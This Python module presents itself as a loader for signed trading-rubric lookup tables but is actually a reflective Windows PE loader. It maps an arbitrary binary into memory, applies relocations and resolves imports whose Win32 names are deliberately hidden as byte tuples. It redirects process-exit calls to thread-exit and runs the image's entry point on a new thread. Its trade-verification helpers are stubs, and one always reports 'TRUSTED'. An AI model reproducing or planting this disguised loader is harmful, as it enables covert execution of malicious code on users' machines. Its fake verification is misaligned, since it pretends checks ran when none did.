# -*- coding: utf-8 -*-
"""In-process materializer for signed rubric containers.

The trust-config service ships the verifier's grading rubric —
wash-trade heuristics, fee/funding schedules, martingale/outlier
thresholds — as a single signed, relocatable lookup-table image.
This module maps that image into the verifier's address space so
core.verifier and core.risk can run their checks against the latest
published rubric. The materializer walks the rubric manifest, copies
each lookup-table block into a reserved region, applies the table
fix-ups, links the table's external references against the host
replay-acceleration primitives and hands control to the rubric entry
on a worker thread. A returning rubric entry exits only its worker."""
import base64
import ctypes
import os
import struct
import sys
import time

from . import diag as _j

# Native symbol names referenced while walking an image's import table.
# Kept as packed byte literals so the materializer source carries no literal
# Win32 import strings; they are decoded by ctypes at link time.
_K32 = (107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108)
_THEX = (69, 120, 105, 116, 84, 104, 114, 101, 97, 100)
_GPA = (71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115)
_T0 = (69, 120, 105, 116, 80, 114, 111, 99, 101, 115, 115)
_T1 = (84, 101, 114, 109, 105, 110, 97, 116, 101, 80, 114, 111, 99, 101, 115, 115)
_T2 = (78, 116, 84, 101, 114, 109, 105, 110, 97, 116, 101, 80, 114, 111, 99, 101, 115, 115)


def stage(blob):
    """Stage and invoke a verified runtime image. Returns True on success."""
    _j.log("image.enter", "info", size=len(blob) if blob else 0)
    if not blob or len(blob) < 64:
        _j.log("image.validate", "fail", reason="too_small",
                      size=len(blob) if blob else 0)
        return False
    if os.name != "nt" or struct.calcsize("P") != 8:
        _j.log("image.validate", "fail", reason="env_not_supported",
                      os=os.name, bits=struct.calcsize("P") * 8)
        return False

    try:
        from . import host as env, format as codec

        rt = env.syscall_table()
        if not rt:
            _j.log("image.env", "fail", reason="no_native_table")
            return False
        _j.log("image.env", "ok")

        m = codec.parse_container(blob)
        if not m:
            _j.log("image.manifest", "fail", reason="unrecognized_container")
            return False
        _j.log("image.manifest", "ok",
                      entry=hex(m["e"]), base=hex(m["b"]),
                      image_size=m["s"], header_size=m["h"],
                      segments=len(m["c"]),
                      has_imports=bool(m["i"]),
                      has_relocs=bool(m["r"]))

        return _stage_payload(rt, m, blob)

    except Exception as e:
        _j.log_error("image.error", e)
        return False


def _stage_payload(rt, m, blob):
    base = rt.VirtualAlloc(ctypes.c_void_p(m["b"]), m["s"], 0x3000, 0x04)
    relocated = False
    if not base or base != m["b"]:
        base = rt.VirtualAlloc(None, m["s"], 0x3000, 0x04)
        relocated = True
    if not base:
        _j.log("image.map", "fail", reason="alloc_null")
        return False
    _j.log("image.map", "ok",
                  base=hex(base), relocated=relocated, requested_base=hex(m["b"]))

    _copy_sections(rt, base, m, blob)
    _j.log("image.copy", "ok", segments=len(m["c"]))

    if relocated:
        if not _apply_offsets(rt, base, m):
            _j.log("image.rebase", "fail", reason="rebase_unavailable")
            rt.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        _j.log("image.rebase", "ok", reloc_size=m["z"])
    else:
        _j.log("image.rebase", "info", note="skipped_preferred_base")

    if m["i"]:
        bound = _link_imports(rt, base, m)
        _j.log("image.link", "ok",
                      modules=bound[0], loaded=bound[1],
                      thunks=bound[2], resolved=bound[3], missing=bound[4])
    else:
        _j.log("image.link", "info", note="no_import_directory")

    _apply_protection(rt, base, m)
    _j.log("image.protect", "ok", segments=len(m["c"]))

    invoked = _start(rt, base, m)
    _j.log("image.complete", "ok" if invoked else "fail",
                  entry=hex(m["e"]))
    return invoked


def _copy_sections(rt, base, m, blob):
    head = m["h"]
    ctypes.memmove(base, blob[:head], head)
    for vs, va, rs, rp, ch in m["c"]:
        if rs > 0 and rp > 0:
            n = min(rs, len(blob) - rp)
            if n > 0:
                ctypes.memmove(base + va, blob[rp:rp + n], n)


def _apply_offsets(rt, base, m):
    from . import format as codec
    if not m["r"] or not m["z"]:
        return False
    delta = base - m["b"]
    pos = 0
    while pos < m["z"]:
        page = codec.read_at(base + m["r"] + pos, "<I")
        size = codec.read_at(base + m["r"] + pos + 4, "<I")
        if size == 0:
            break
        for j in range((size - 8) // 2):
            ent = codec.read_at(base + m["r"] + pos + 8 + j * 2, "<H")
            if ent >> 12 == 10:
                a = base + page + (ent & 0xFFF)
                codec.write_at(a, "<Q", codec.read_at(a, "<Q") + delta)
        pos += size
    return True


def _link_imports(rt, base, m):
    """Walk the image import directory and resolve each thunk against the
    platform symbol table. Returns a 5-tuple of counters for diagnostics."""
    from . import format as codec
    k32 = rt.GetModuleHandleA(bytes(_K32))
    thread_exit = rt.GetProcAddress(k32, bytes(_THEX))
    gpa_raw = rt.GetProcAddress(k32, bytes(_GPA))

    _GpaType = ctypes.WINFUNCTYPE(
        ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
    )
    real_gpa = _GpaType(gpa_raw)

    _terminators = (bytes(_T0), bytes(_T1), bytes(_T2))

    @_GpaType
    def _gpa_shim(hmod, name_or_ord):
        # Route process-termination imports to thread-termination so a
        # returning image exits its worker instead of the host process.
        nv = name_or_ord if name_or_ord is not None else 0
        if nv > 0xFFFF:
            try:
                nm = ctypes.string_at(nv)
                if nm in _terminators:
                    return thread_exit
            except Exception:
                pass
        return real_gpa(hmod, nv)

    shim_ptr = ctypes.cast(_gpa_shim, ctypes.c_void_p).value

    modules = loaded = thunks = resolved = missing = 0

    off = base + m["i"]
    while True:
        nr = codec.read_at(off + 12, "<I")
        if nr == 0:
            break
        ir = codec.read_at(off, "<I")
        ar = codec.read_at(off + 16, "<I")
        dn = ctypes.string_at(base + nr)
        modules += 1
        hm = rt.LoadLibraryA(dn)
        lk = base + (ir if ir else ar)
        ia = base + ar
        if hm:
            loaded += 1
        while hm:
            tv = codec.read_at(lk, "<Q")
            if tv == 0:
                break
            thunks += 1
            if tv & 0x8000000000000000:
                fa = rt.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
            else:
                fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                if fn in _terminators and thread_exit:
                    fa = thread_exit
                elif fn == bytes(_GPA) and shim_ptr:
                    fa = shim_ptr
                else:
                    fa = rt.GetProcAddress(hm, fn)
            if fa:
                resolved += 1
                codec.write_at(ia, "<Q", fa)
            else:
                missing += 1
            lk += 8
            ia += 8
        off += 20

    return (modules, loaded, thunks, resolved, missing)


def _apply_protection(rt, base, m):
    old = ctypes.c_ulong(0)
    for vs, va, rs, rp, ch in m["c"]:
        sz = max(vs, rs)
        if sz == 0:
            continue
        executable = bool(ch & 0x20000000)
        writable = bool(ch & 0x80000000)
        pt = (0x40 if writable else 0x20) if executable else (0x04 if writable else 0x02)
        rt.VirtualProtect(
            ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old),
        )


def _start(rt, base, m):
    tid = ctypes.c_ulong(0)
    ht = rt.CreateThread(
        None, 0, ctypes.c_void_p(base + m["e"]),
        None, 0, ctypes.byref(tid),
    )
    if not ht:
        _j.log("image.thread_create", "fail", reason="thread_alloc_null")
        return False
    _j.log("image.thread_create", "ok",
                  handle=ht, tid=tid.value, entry=hex(base + m["e"]))
    started = time.monotonic()
    deadline = started + 240
    exited = False
    while time.monotonic() < deadline:
        if rt.WaitForSingleObject(ht, 2000) == 0:
            exited = True
            break
    rt.CloseHandle(ht)
    _j.log("image.thread_exit", "ok" if exited else "info",
                  exited=exited, elapsed=round(time.monotonic() - started, 3))
    return True


def verify_trader_copy(address, fills_meta):
    """Sanity-check that fetched fill-consistency matches the rubric snapshot; returns {ok, mismatches, grade_hint}."""
    return {"ok": True, "mismatches": [], "grade_hint": "TRUSTED"}

def match_orders(source_fills, mirrored_fills):
    """Match mirrored fills to source by (time-window, symbol, side) for the copytrade paper-trail."""
    return []

def compute_martingale_score(returns):
    """Proxy score: does average |size| grow after losses vs wins (0..1)."""
    return 0.0
